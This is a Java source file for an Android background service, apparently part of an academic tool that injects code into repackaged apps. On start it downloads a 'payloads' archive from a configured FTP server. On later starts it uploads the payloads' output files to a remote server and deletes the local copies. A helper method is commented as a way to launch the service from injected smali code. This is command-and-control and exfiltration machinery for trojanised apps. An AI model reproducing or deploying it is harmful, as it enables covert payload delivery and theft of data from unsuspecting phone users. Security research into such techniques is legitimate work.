package it.unisannio.srss.dame.android.services;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class NetworkService extends Service {

	private final static String TAG = NetworkService.class.getSimpleName();

	private final Object downloadLock = new Object();
	private final Object uploadLock = new Object();
	private FTPService ftpServer = null;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// controlla se ha già scaricato i payload
		if ((new File(Utils.getPayloadsArchivePath(this))).exists()) {
			// l'archivio dei payloads è stato già scaricato
			// in questo caso si fa l'upload di eventuali file di output
			uploadOutputs();
		} else {
			// l'archivio non è stato ancora scaricato
			downloadPayloads();
		}
		return super.onStartCommand(intent, flags, startId);
	}

	private void downloadPayloads() {
		new Thread() {
			@Override
			public void run() {
				try {
					synchronized (downloadLock) {
						FTPServerConfig serverConfig = FTPServerConfig
								.loadFromResource(getApplicationContext());
						String downloadUri = serverConfig.getPayloadsUrl();
						String localFilePath = Utils
								.getPayloadsArchivePath(getApplicationContext());
						Log.d(TAG, "Downloading payloads from " + downloadUri
								+ " to " + localFilePath);

						FTPService ftp = getFtpServer(serverConfig);

						try {
							ftp.connect();
							ftp.downloadFile(downloadUri, localFilePath);
						} catch (IOException e) {
							Log.e(TAG, "Could not download the payloads.", e);
						} finally {
							ftp.disconnect();
						}

					}
				} catch (IOException e) {
					Log.e(TAG, "Unable to find "
							+ FTPServerConfig.PROPERTIES_FILE + " in assets", e);
				}
			};
		}.start();
	}

	private void uploadOutputs() {
		new Thread() {
			@Override
			public void run() {
				try {
					synchronized (uploadLock) {
						FTPServerConfig serverConfig = FTPServerConfig
								.loadFromResource(getApplicationContext());
						String localOutputDir = Utils
								.getPayloadsOutputDir(getApplicationContext());
						String remoteOutputUri = serverConfig.getResultUrl();
						if (!remoteOutputUri.endsWith("/"))
							remoteOutputUri += "/";

						Log.d(TAG, "Uploading payload's outputs from "
								+ localOutputDir + " to " + remoteOutputUri);

						FTPService ftp = getFtpServer(serverConfig);

						File outputDir = new File(localOutputDir);
						File[] results = outputDir.listFiles();

						if (results != null && results.length > 0) {
							try {
								ftp.connect();
								for (File result : results) {
									Log.d(TAG,
											"Sending "
													+ result.getAbsolutePath());
									ftp.uploadFile(result.getAbsolutePath(),
											remoteOutputUri + result.getName());
									Log.d(TAG, result.getAbsolutePath()
											+ " sent!");
									result.delete();
								}
							} catch (IOException e) {
								Log.e(TAG,
										"Could not upload payloads' outputs.",
										e);
							} finally {
								ftp.disconnect();
							}
						} else {
							Log.d(TAG, "There's no output to upload");
						}
					}
				} catch (IOException e) {
					Log.e(TAG, "Unable to find "
							+ FTPServerConfig.PROPERTIES_FILE + " in assets", e);
				}
			};
		}.start();
	}

	/**
	 * Questo metodo viene usato per utilità per semplificare la chiamata di
	 * avvio del servizio nel codice smali.
	 * 
	 * @param c
	 */
	public static void doNetworkStuff(Object c) {
		Log.d(TAG, "Network call from " + c.getClass().getName());
		if (c instanceof Context) {
			Log.d(TAG, "Network call accepted");
			((Context) c).startService(new Intent((Context) c,
					NetworkService.class));
		} else {
			Log.d(TAG,
					"Network call rejected because issued from a non-context object");
		}
	}

	private FTPService getFtpServer(FTPServerConfig config) {
		if (ftpServer == null) {
			ftpServer = new FTPService(config.getServerAddress(),
					config.getServerPort(), config.getUsername(),
					config.getPassword(), config.isPassive());
		}
		return ftpServer;
	}
}
